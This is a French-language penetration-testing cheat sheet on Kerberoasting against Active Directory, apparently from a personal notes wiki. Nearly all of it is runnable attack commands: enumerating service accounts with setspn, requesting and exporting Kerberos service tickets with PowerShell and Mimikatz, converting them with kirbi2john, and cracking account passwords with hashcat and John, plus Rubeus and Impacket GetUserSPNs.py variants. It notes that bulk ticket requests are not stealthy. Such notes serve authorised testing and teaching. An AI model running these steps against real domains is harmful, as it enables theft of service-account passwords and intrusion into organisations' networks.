---
public: true # set to true to make the article publishable
---
## Sources

- https://dl.packetstormsecurity.net/papers/general/kerberoasting.pdf

## Objectifs
- Obtenir une liste de compte utilisateurs disposant d'un SPN
- Collecter les TGS associés à ces SPNs (chiffrés en RC4)
- Tenter de cracker les mots de passe des comptes utilisateurs à partir des TGS récupérés (qui sont chiffrés avec les hash de comptes utilisateurs respectifs)

## Méthodologie
### Locale

#### Manuelle

##### Récupérer un TGS

###### Liste des comptes avec leurs SPNs
```shell
# Enumérer tous les SPNs
setspn.exe -q */*
```

###### Demande d'un TGS

```powershell
# Demander un TGS pour le SPN désiré (compte utilisateur)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MyUSERWithSPN/srvtest.domain.local"
```

###### Demander tous les TGS existants

Attention, cela ne sera pas du tout furtif !

```powershell
# Demander tous les TGS possibles
Add-Type -AssemblyName System.IdentityModel
setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

##### Extraire le ou les Tickets (TGS)

Une fois les TGS générés par le KDC et stockés dans le système d'exploitation, on peut les récupérer via `Mimikatz`. 

```
mimikatz # base64 /out:true    <==== si on veut les transférer par copier / coller par exemple
mimikatz # base64 /out:true    <==== si on veut générer des fichiers .kirbi

mimikatz # kerberos::list /export  
```

```shell
# conversion depuis base64
echo "<base64 blob>" |  tr -d \\n | base64 -d > myUser.kirbi
# Extraction du hash pour l'utiliser avec john / hashcat
kirbi2john.py myUser.kirbi  # génère un fichier crack_file
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > myUser_tgs_hashcat
# Cassage avec hashcat
hashcat -m 13100 myUser_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

#### Utiliser Rubeus.exe

Il réalise les opérations suivantes :
- découverte des SPNs
- Dump des TGS
- Obtention des Hashs
- 
./Rubeus.exe kerberoast /outfile:hash.txt


#### Cracker les hash :

hashcat -m 13100 --force -a 0 hash.txt dict.txt

### Distante

#### Impacket

##### Utiliser GetUserSPNs.py
 Il réalise les opérations suivantes :
- découverte des SPNs
- Dump des TGS
- Obtention des Hashs

```
# Liste des comptes disposant d'un SPN
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD

# Récupération des TGS
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request

# Récupération d'un unique TGS
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request-user interesting.user

# Enregistrement des TGS pour les fournier à john / hashcat (fichier 'hashes.txt')
GetUserSPNs.py -dc-ip $TARGET_IP $AD_DOMAIN/$AD_USER:$AD_PASSWORD -request -outputfile hashes.txt
```

##### Cracker les hash (bruteforce)

```
john --wordlist=/path/to/rockyou.txt hashes.txt
```
[[_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]
